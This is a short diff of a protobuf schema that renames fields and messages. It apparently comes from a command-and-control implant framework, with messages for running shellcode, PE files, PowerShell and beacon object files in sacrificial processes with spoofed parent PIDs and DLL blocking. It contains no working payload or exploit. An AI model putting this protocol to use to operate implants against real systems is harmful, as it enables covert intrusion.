@@ -171,7 +171,7 @@ message FileInfo {
 }
 
 message SacrificeProcess {
-  bool need_output = 1;
+  bool output = 1;
   bool block_dll = 2;
   uint32 ppid = 3;
   string argue = 4;
@@ -204,7 +204,7 @@ message ExecResponse {
   uint32 pid = 4;
 }
 
-message ExecsRequest {
+message ExecSacrificeRequest {
   string path = 1;
   SacrificeProcess sacrifice = 2;
 }
@@ -263,7 +263,7 @@ message ExecuteBof {
 message ExecuteShellcode {
   string name = 1;
   bytes bin = 2;
-  bool need_output = 3;
+  bool output = 3;
   SacrificeProcess sacrifice = 4;
 
 
@@ -281,7 +281,7 @@ message ExecutePowershell {
 message ExecutePE {
   string name = 1;
   bytes bin = 2;
-  bool need_output = 3;
+  bool output = 3;
   SacrificeProcess sacrifice = 4;
 }
 
